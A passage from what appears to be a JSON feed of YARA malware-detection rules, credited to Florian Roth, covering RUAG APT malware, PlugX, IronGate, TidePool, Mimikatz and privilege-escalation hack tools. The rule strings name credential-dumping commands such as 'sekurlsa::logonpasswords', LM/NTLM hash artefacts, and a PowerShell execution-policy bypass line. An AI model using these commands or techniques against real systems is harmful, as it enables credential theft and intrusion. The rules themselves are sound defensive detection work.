file SharpCat_RID2A27.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Cn33liz/SharpCat_RID2A27\"\n      date = \"2016-06-10 03:56:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ShellZz\" fullword ascii\n      $s2 = \"C:\\\\Windows\\\\System32\\\\cmd.exe\" fullword wide\n      $s3 = \"currentDirectory\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and all of them\n}","date":"2016-06-10 03:56:41","description":"Detects Hack Tool SharpCat - file SharpCat.exe","minimum_yara":"1.7","name":"SharpCat_RID2A27","reference":"https://github.com/Cn33liz/SharpCat","required_modules":[],"rule_hash":"cb6b28395b5d370ea4ac33c3bbd0df5f","score":80,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule RUAG_APT_srsvc_RID2C14 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware used in the RUAG APT case\"\n      author = \"Florian Roth\"\n      reference = \"https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case\"\n      date = \"2016-06-09 09:33:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"SVCHostServiceDll.dll\" fullword ascii\n      $s2 = \"msimghlp.dll\" fullword wide\n      $s3 = \"srservice\" fullword wide\n      $s4 = \"ModStart\" fullword ascii\n      $s5 = \"ModStop\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( 1 of ( $x* ) or all of ( $s* ) ) ) or ( all of them )\n}","date":"2016-06-09 09:33:51","description":"Detects malware used in the RUAG APT case","minimum_yara":"1.7","name":"RUAG_APT_srsvc_RID2C14","reference":"https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case","required_modules":[],"rule_hash":"9a65217e2c2f000a82a7e970a2423316","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule RUAG_APT_Malware_Gen1_RID2E56 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware used in the RUAG APT case\"\n      author = \"Florian Roth\"\n      reference = \"https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case\"\n      date = \"2016-06-09 11:10:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"too long data for this type of transport\" fullword ascii\n      $x2 = \"not enough server resources to complete operation\" fullword ascii\n      $x3 = \"Task not execute. Arg file failed.\" fullword ascii\n      $x4 = \"Global\\\\MSCTF.Shared.MUTEX.ZRX\" fullword ascii\n      $s1 = \"peer has closed the connection\" fullword ascii\n      $s2 = \"tcpdump.exe\" fullword ascii\n      $s3 = \"windump.exe\" fullword ascii\n      $s4 = \"dsniff.exe\" fullword ascii\n      $s5 = \"wireshark.exe\" fullword ascii\n      $s6 = \"ethereal.exe\" fullword ascii\n      $s7 = \"snoop.exe\" fullword ascii\n      $s8 = \"ettercap.exe\" fullword ascii\n      $s9 = \"miniport.dat\" fullword ascii\n      $s10 = \"net_password=%s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 2 of ( $x* ) or 8 of ( $s* ) ) ) or ( 12 of them )\n}","date":"2016-06-09 11:10:11","description":"Detects malware used in the RUAG APT case","minimum_yara":"1.7","name":"RUAG_APT_Malware_Gen1_RID2E56","reference":"https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case","required_modules":[],"rule_hash":"378d747a8b1d50f9e8a633ea9772dc0b","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule RUAG_APT_Malware_Gen2_RID2E57 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware used in the RUAG APT case\"\n      author = \"Florian Roth\"\n      reference = \"https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case\"\n      date = \"2016-06-09 11:10:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Internal command not support =((\" fullword ascii\n      $x2 = \"L|-1|AS_CUR_USER:OpenProcessToken():%d, %s|\" fullword ascii\n      $x3 = \"L|-1|CreateProcessAsUser():%d, %s|\" fullword ascii\n      $x4 = \"AS_CUR_USER:OpenProcessToken():%d\" fullword ascii\n      $x5 = \"L|-1|AS_CUR_USER:LogonUser():%d, %s|\" fullword ascii\n      $x6 = \"L|-1|try to run dll %s with user priv|\" fullword ascii\n      $x7 = \"\\\\\\\\.\\\\Global\\\\PIPE\\\\sdlrpc\" fullword ascii\n      $x8 = \"\\\\\\\\%s\\\\pipe\\\\comnode\" fullword ascii\n      $x9 = \"Plugin dll stop failed.\" fullword ascii\n      $x10 = \"AS_USER:LogonUser():%d\" fullword ascii\n      $s1 = \"MSIMGHLP.DLL\" fullword wide\n      $s2 = \"msimghlp.dll\" fullword ascii\n      $s3 = \"ximarsh.dll\" fullword ascii\n      $s4 = \"msximl.dll\" fullword ascii\n      $s5 = \"INTERNAL.dll\" fullword ascii\n      $s6 = \"\\\\\\\\.\\\\Global\\\\PIPE\\\\\" fullword ascii\n      $s7 = \"ieuser.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) or 5 of ( $s* ) ) ) or ( 10 of them )\n}","date":"2016-06-09 11:10:21","description":"Detects malware used in the RUAG APT case","minimum_yara":"1.7","name":"RUAG_APT_Malware_Gen2_RID2E57","reference":"https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case","required_modules":[],"rule_hash":"8d2782742892856d8c1acd6fea08365d","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule RUAG_APT_Malware_Gen3_RID2E58 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware used in the RUAG APT case\"\n      author = \"Florian Roth\"\n      reference = \"https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case\"\n      date = \"2016-06-09 11:10:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Mozilla/4.0 (compatible; MSIE %d.0; \" fullword ascii\n      $x2 = \"\\\\\\\\.\\\\pipe\\\\sdlrpc\" fullword ascii\n      $x3 = \"WaitMutex Abandoned %p\" fullword ascii\n      $x4 = \"OPER|Wrong config: no port|\" fullword ascii\n      $x5 = \"OPER|Wrong config: no lastconnect|\" fullword ascii\n      $x6 = \"OPER|Wrong config: empty address|\" fullword ascii\n      $x7 = \"Trans task %d obj %s ACTIVE fail robj %s\" fullword ascii\n      $x8 = \"OPER|Wrong config: no auth|\" fullword ascii\n      $x9 = \"OPER|Sniffer '%s' running... ooopppsss...|\" fullword ascii\n      $s1 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\5.0\\\\User Agent\\\\Post Platform\" fullword ascii\n      $s2 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\5.0\\\\User Agent\\\\Pre Platform\" fullword ascii\n      $s3 = \"www.yahoo.com\" fullword ascii\n      $s4 = \"MSXIML.DLL\" fullword wide\n      $s5 = \"www.bing.com\" fullword ascii\n      $s6 = \"%s: http://%s%s\" fullword ascii\n      $s7 = \"/javascript/view.php\" fullword ascii\n      $s8 = \"Task %d failed %s,%d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) or 6 of ( $s* ) ) ) or ( 10 of them )\n}","date":"2016-06-09 11:10:31","description":"Detects malware used in the RUAG APT case","minimum_yara":"1.7","name":"RUAG_APT_Malware_Gen3_RID2E58","reference":"https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case","required_modules":[],"rule_hash":"2ca12d50f35b0a3dd61f9ab225d24fcb","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule PlugX_J16_Gen_RID2B8A : DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detects PlugX Malware samples from June 2016\"\n      author = \"Florian Roth\"\n      reference = \"MISP 3954\"\n      date = \"2016-06-08 09:10:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%WINDIR%\\\\SYSTEM32\\\\SERVICES.EXE\" fullword wide\n      $x2 = \"\\\\\\\\.\\\\PIPE\\\\RUN_AS_USER(%d)\" fullword wide\n      $x3 = \"LdrLoadShellcode\" fullword ascii\n      $x4 = \"Protocol:[%4s], Host: [%s:%d], Proxy: [%d:%s:%d:%s:%s]\" fullword ascii\n      $s1 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\User Agent\\\\Post Platform\" fullword wide\n      $s2 = \"%s\\\\msiexec.exe %d %d\" fullword wide\n      $s3 = \"l%s\\\\sysprep\\\\CRYPTBASE.DLL\" fullword wide\n      $s4 = \"%s\\\\msiexec.exe UAC\" fullword wide\n      $s5 = \"CRYPTBASE.DLL\" fullword wide\n      $s6 = \"%ALLUSERSPROFILE%\\\\SxS\" fullword wide\n      $s7 = \"%s\\\\sysprep\\\\sysprep.exe\" fullword wide\n      $s8 = \"\\\\\\\\.\\\\pipe\\\\a%d\" fullword wide\n      $s9 = \"\\\\\\\\.\\\\pipe\\\\b%d\" fullword wide\n      $s10 = \"EName:%s,EAddr:0x%p,ECode:0x%p,EAX:%p,EBX:%p,ECX:%p,EDX:%p,ESI:%p,EDI:%p,EBP:%p,ESP:%p,EIP:%p\" fullword ascii\n      $s11 = \"Mozilla/4.0 (compatible; MSIE \" fullword wide\n      $s12 = \"; Windows NT %d.%d\" fullword wide\n      $s13 = \"SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Version Vector\" fullword wide\n      $s14 = \"\\\\bug.log\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 1 of ( $x* ) or 4 of ( $s* ) ) ) or ( 8 of them )\n}","date":"2016-06-08 09:10:51","description":"Detects PlugX Malware samples from June 2016","minimum_yara":"1.7","name":"PlugX_J16_Gen_RID2B8A","reference":"MISP 3954","required_modules":[],"rule_hash":"094d34874121d556cb002e6a43907346","score":75,"tags":["DEMO","EXE","GEN","FILE","MAL"]},{"author":"Florian Roth","content":"rule PlugX_J16_Gen2_RID2BBC : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects PlugX Malware Samples from June 2016\"\n      author = \"Florian Roth\"\n      reference = \"MISP 3954\"\n      date = \"2016-06-08 09:19:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"XPlugKeyLogger.cpp\" fullword ascii\n      $s2 = \"XPlugProcess.cpp\" fullword ascii\n      $s4 = \"XPlgLoader.cpp\" fullword ascii\n      $s5 = \"XPlugPortMap.cpp\" fullword ascii\n      $s8 = \"XPlugShell.cpp\" fullword ascii\n      $s11 = \"file: %s, line: %d, error: [%d]%s\" fullword ascii\n      $s12 = \"XInstall.cpp\" fullword ascii\n      $s13 = \"XPlugTelnet.cpp\" fullword ascii\n      $s14 = \"XInstallUAC.cpp\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 2 of ( $s* ) ) ) or ( 5 of them )\n}","date":"2016-06-08 09:19:11","description":"Detects PlugX Malware Samples from June 2016","minimum_yara":"1.7","name":"PlugX_J16_Gen2_RID2BBC","reference":"MISP 3954","required_modules":[],"rule_hash":"83646ed9e41706f8c041b82fed34b529","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Mimikatz_Strings_RID2DA0 : DEMO EXE FILE MAL T1003 T1075 T1097 T1178 {\n   meta:\n      description = \"Detects Mimikatz strings\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2016-06-08 10:39:51\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1003, T1075, T1097, T1178\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"sekurlsa::logonpasswords\" fullword wide ascii\n      $x2 = \"List tickets in MIT/Heimdall ccache\" fullword ascii wide\n      $x3 = \"kuhl_m_kerberos_ptt_file ; LsaCallKerberosPackage %08x\" fullword ascii wide\n      $x4 = \"* Injecting ticket :\" fullword wide ascii\n      $x5 = \"mimidrv.sys\" fullword wide ascii\n      $x6 = \"Lists LM & NTLM credentials\" fullword wide ascii\n      $x7 = \"\\\\_ kerberos -\" fullword wide ascii\n      $x8 = \"* unknow   :\" fullword wide ascii\n      $x9 = \"\\\\_ *Password replace ->\" fullword wide ascii\n      $x10 = \"KIWI_MSV1_0_PRIMARY_CREDENTIALS KO\" ascii wide\n      $x11 = \"\\\\\\\\.\\\\mimidrv\" wide ascii\n      $x12 = \"Switch to MINIDUMP :\" fullword wide ascii\n      $x13 = \"[masterkey] with password: %s (%s user)\" fullword wide\n      $x14 = \"Clear screen (doesn't work with redirections, like PsExec)\" fullword wide\n      $x15 = \"** Session key is NULL! It means allowtgtsessionkey is not set to 1 **\" fullword wide\n      $x16 = \"[masterkey] with DPAPI_SYSTEM (machine, then user): \" fullword wide\n   condition: \n      ( ( uint16 ( 0 ) == 0x5a4d and 1 of ( $x* ) ) or ( 3 of them ) ) and not pe.imphash ( ) == \"77eaeca738dd89410a432c6bd6459907\"\n}","date":"2016-06-08 10:39:51","description":"Detects Mimikatz strings","minimum_yara":"1.7","name":"Mimikatz_Strings_RID2DA0","reference":"not set","required_modules":["pe"],"rule_hash":"0165b2978a56e010701eca3c26d75e16","score":65,"tags":["T1178","T1097","MAL","T1075","DEMO","T1003","FILE","EXE"]},{"author":"Florian Roth","content":"rule IronGate_APT_Step7ProSim_Gen_RID3173 : APT DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detects IronGate APT Malware - Step7ProSim DLL\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/Mr6M2J\"\n      date = \"2016-06-04 13:23:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\obj\\\\Release\\\\Step7ProSim.pdb\" ascii\n      $s1 = \"Step7ProSim.Interfaces\" fullword ascii\n      $s2 = \"payloadExecutionTimeInMilliSeconds\" fullword ascii\n      $s3 = \"PackagingModule.Step7ProSim.dll\" fullword wide\n      $s4 = \"<KillProcess>b__0\" fullword ascii\n      $s5 = \"newDllFilename\" fullword ascii\n      $s6 = \"PackagingModule.exe\" fullword wide\n      $s7 = \"$863d8af0-cee6-4676-96ad-13e8540f4d47\" fullword ascii\n      $s8 = \"RunPlcSim\" fullword ascii\n      $s9 = \"$ccc64bc5-ef95-4217-adc4-5bf0d448c272\" fullword ascii\n      $s10 = \"InstallProxy\" fullword ascii\n      $s11 = \"DllProxyInstaller\" fullword ascii\n      $s12 = \"FindFileInDrive\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and ( $x1 or 3 of ( $s* ) ) ) or ( 6 of them )\n}","date":"2016-06-04 13:23:01","description":"Detects IronGate APT Malware - Step7ProSim DLL","minimum_yara":"1.7","name":"IronGate_APT_Step7ProSim_Gen_RID3173","reference":"https://goo.gl/Mr6M2J","required_modules":[],"rule_hash":"38328b3f4797da32e1acfc1e2928e927","score":90,"tags":["MAL","DEMO","FILE","APT","GEN","EXE"]},{"author":"Florian Roth","content":"rule IronGate_PyInstaller_update_EXE_RID3323 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects a PyInstaller file named update.exe as mentioned in the IronGate APT\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/Mr6M2J\"\n      date = \"2016-06-04 14:35:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"bpython27.dll\" fullword ascii\n      $s5 = \"%s%s.exe\" fullword ascii\n      $s6 = \"bupdate.exe.manifest\" fullword ascii\n      $s9 = \"bunicodedata.pyd\" fullword ascii\n      $s11 = \"distutils.sysconfig(\" fullword ascii\n      $s16 = \"distutils.debug(\" fullword ascii\n      $s18 = \"supdate\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and all of them\n}","date":"2016-06-04 14:35:01","description":"Detects a PyInstaller file named update.exe as mentioned in the IronGate APT","minimum_yara":"1.7","name":"IronGate_PyInstaller_update_EXE_RID3323","reference":"https://goo.gl/Mr6M2J","required_modules":[],"rule_hash":"8667f454f4c05442ab6e5a122f650b1a","score":60,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule Nirsoft_NetResView_RID2E41 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects NirSoft NetResView - utility that displays the list of all network resources\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/Mr6M2J\"\n      date = \"2016-06-04 11:06:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"NetResView.exe\" fullword wide\n      $s2 = \"2005 - 2013 Nir Sofer\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}","date":"2016-06-04 11:06:41","description":"Detects NirSoft NetResView - utility that displays the list of all network resources","minimum_yara":"1.7","name":"Nirsoft_NetResView_RID2E41","reference":"https://goo.gl/Mr6M2J","required_modules":[],"rule_hash":"aaef31c5a2b2ac01bee6baff3b4a32c5","score":40,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule LM_hash_empty_String_RID2F11 : DEMO HKTL {\n   meta:\n      description = \"Detects the empty LM hash on disk/in memory/as output from hacking tools\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2016-06-03 11:41:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"500:AAD3B435B51404EEAAD3B435B51404EE:\" ascii\n      $s1 = \"500:aad3b435b51404eeaad3b435b51404ee:\" ascii\n   condition: \n      1 of them\n}","date":"2016-06-03 11:41:21","description":"Detects the empty LM hash on disk/in memory/as output from hacking tools","minimum_yara":"1.7","name":"LM_hash_empty_String_RID2F11","reference":"-","required_modules":[],"rule_hash":"8b88b6407f128061ea31fe5e9c23befb","score":80,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule Win_PrivEsc_gp3finder_v4_0_RID30D3 : DEMO EXE FILE HKTL T1068 {\n   meta:\n      description = \"Detects a tool that can be used for privilege escalation - file gp3finder_v4.0.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://grimhacker.com/2015/04/10/gp3finder-group-policy-preference-password-finder/\"\n      date = \"2016-06-02 12:56:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Check for and attempt to decrypt passwords on share\" ascii\n      $x2 = \"Failed to auto get and decrypt passwords. {0}s/\" fullword ascii\n      $x3 = \"GPPPFinder - Group Policy Preference Password Finder\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and 1 of ( $x* ) ) or ( all of them )\n}","date":"2016-06-02 12:56:21","description":"Detects a tool that can be used for privilege escalation - file gp3finder_v4.0.exe","minimum_yara":"1.7","name":"Win_PrivEsc_gp3finder_v4_0_RID30D3","reference":"http://grimhacker.com/2015/04/10/gp3finder-group-policy-preference-password-finder/","required_modules":[],"rule_hash":"63f3b51f6b461d3a91d62f5ada2f4fd0","score":80,"tags":["DEMO","EXE","T1068","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Win_PrivEsc_folderperm_RID2FE9 : DEMO HKTL T1068 {\n   meta:\n      description = \"Detects a tool that can be used for privilege escalation - file folderperm.ps1\"\n      author = \"Florian Roth\"\n      reference = \"http://www.greyhathacker.net/?p=738\"\n      date = \"2016-06-02 12:17:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"# powershell.exe -executionpolicy bypass -file folderperm.ps1\" fullword ascii\n      $x2 = \"Write-Host \\\"[i] Dummy test file used to test access was not outputted:\\\" $filetocopy\" fullword ascii\n      $x3 = \"Write-Host -foregroundColor Red \\\"      Access denied :\\\" $myarray[$i] \" fullword ascii\n   condition: \n      1 of them\n}","date":"2016-06-02 12:17:21","description":"Detects a tool that can be used for privilege escalation - file folderperm.ps1","minimum_yara":"1.7","name":"Win_PrivEsc_folderperm_RID2FE9","reference":"http://www.greyhathacker.net/?p=738","required_modules":[],"rule_hash":"c6d020fdb2c341ca2319e1e610c6203e","score":80,"tags":["DEMO","T1068","HKTL"]},{"author":"Florian Roth","content":"rule Win_PrivEsc_ADACLScan4_3_RID2F59 : DEMO HKTL T1068 {\n   meta:\n      description = \"Detects a tool that can be used for privilege escalation - file ADACLScan4.3.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://adaclscan.codeplex.com/\"\n      date = \"2016-06-02 11:53:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<Label x:Name=\\\"lblPort\\\" Content=\\\"Port:\\\"  HorizontalAlignment=\\\"Left\\\" Height=\\\"28\\\" Margin=\\\"10,0,0,0\\\" Width=\\\"35\\\"/>\" fullword ascii\n      $s2 = \"(([System.IconExtractor]::Extract(\\\"mmcndmgr.dll\\\", 126, $true)).ToBitMap()).Save($env:temp + \\\"\\\\Other.png\\\")    \" fullword ascii\n      $s3 = \"$bolValid = $ctx.ValidateCredentials($psCred.UserName,$psCred.GetNetworkCredential().Password)\" fullword ascii\n   condition: \n      all of them\n}","date":"2016-06-02 11:53:21","description":"Detects a tool that can be used for privilege escalation - file ADACLScan4.3.ps1","minimum_yara":"1.7","name":"Win_PrivEsc_ADACLScan4_3_RID2F59","reference":"https://adaclscan.codeplex.com/","required_modules":[],"rule_hash":"fb157df74f83433b8799c576fb9b93d4","score":60,"tags":["DEMO","T1068","HKTL"]},{"author":"Florian Roth","content":"rule TidePool_Malware_RID2D59 : DEMO EXE FILE MAL T1085 {\n   meta:\n      description = \"Detects TidePool malware mentioned in Ke3chang report by Palo Alto Networks\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/m2CXWR\"\n      date = \"2016-05-24 10:28:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Content-Disposition: form-data; name=\\\"m1.jpg\\\"\" fullword ascii\n      $x2 = \"C:\\\\PROGRA~2\\\\IEHelper\\\\mshtml.dll\" fullword wide\n      $x3 = \"C:\\\\DOCUME~1\\\\ALLUSE~1\\\\IEHelper\\\\mshtml.dll\" fullword wide\n      $x4 = \"IEComDll.dat\" fullword ascii\n      $s1 = \"Content-Type: multipart/form-data; boundary=----=_Part_%x\" fullword wide\n      $s2 = \"C:\\\\Windows\\\\System32\\\\rundll32.exe\" fullword wide\n      $s3 = \"network.proxy.socks_port\\\", \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) ) ) or ( 4 of them )\n}","date":"2016-05-24 10:28:01","description":"Detects TidePool malware mentioned in Ke3chang report by Palo Alto Networks","minimum_yara":"1.7","name":"TidePool_Malware_RID2D59","reference":"http://goo.gl/m2CXWR","required_modules":[],"rule_hash":"83cde3c24a6049da490ead989c06d2a5","score":75,"tags":["DEMO","T1085","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule RUAG_Tavdig_Malformed_Executable_RID3355 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects an embedded executable with a malformed header - known from Tavdig malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/N5MEj0\"\n      date = \"2016-05-23 14:43:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and uint32 ( uint32 ( 0x3C ) ) == 0x0000AD0B\n}","date":"2016-05-23 14:43:21","description":"Detects an embedded executable with a malformed header - known from Tavdig malware","minimum_yara":"1.7","name":"RUAG_Tavdig_Malformed_Executable_RID3355","reference":"https://goo.gl/N5MEj0","required_modules":[],"rule_hash":"e16cd17470718414cebd80c69b8a736c","score":60,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule RUAG_Bot_Config_File_RID2E58 : APT DEMO FILE {\n   meta:\n      description = \"Detects a specific config file used by malware in RUAG APT case\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/N5MEj0\"\n      date = \"2016-05-23 11:10:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[CONFIG]\" ascii\n      $s2 = \"name = \" ascii\n      $s3 = \"exe = cmd.exe\" ascii\n   condition: \n      uint32 ( 0 ) == 0x4e4f435b and $s1 at 0 and $s2 and $s3 and filesize < 160\n}","date":"2016-05-23 11:10:31","description":"Detects a specific config file used by malware in RUAG APT case","minimum_yara":"1.7","name":"RUAG_Bot_Config_File_RID2E58","reference":"https://goo.gl/N5MEj0","required_modules":[],"rule_hash":"b4135aa113df1c9403c390baa3e8e1ba","score":60,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule RUAG_Cobra_Malware_RID2DAE : APT DEMO EXE FILE MAL NK {\n   meta:\n      description = \"Detects a malware mentioned in the RUAG Case called Carbon/Cobra\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/N5MEj0\"\n      date = \"2016-05-23 10:42:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Cobra\\\\Release\\\\Cobra.pdb\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and $s1\n}","date":"2016-05-23 10:42:11","description":"Detects a malware mentioned in the RUAG Case called Carbon/Cobra","minimum_yara":"1.7","name":"RUAG_Cobra_Malware_RID2DAE","reference":"https://goo.gl/N5MEj0","required_modules":[],"rule_hash":"9a30aa4c11b1ab858c016e07ccaa8310","score":60,"tags":["NK","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule RUAG_Cobra_Config_File_RID2F1A : APT DEMO FILE NK {\n   meta:\n      description = \"Detects a config text file used by malware Cobra in RUAG case\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/N5MEj0\"\n      date = \"2016-05-23 11:42:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $h1 = \"[NAME]\" ascii\n      $s1 = \"object_id=\" ascii\n      $s2 = \"[TIME]\" ascii fullword\n      $s3 = \"lastconnect\" ascii\n      $s4 = \"[CW_LOCAL]\" ascii fullword\n      $s5 = \"system_pipe\" ascii\n      $s6 = \"user_pipe\" ascii\n      $s7 = \"[TRANSPORT]\" ascii\n      $s8 = \"run_task_system\" ascii\n      $s9 = 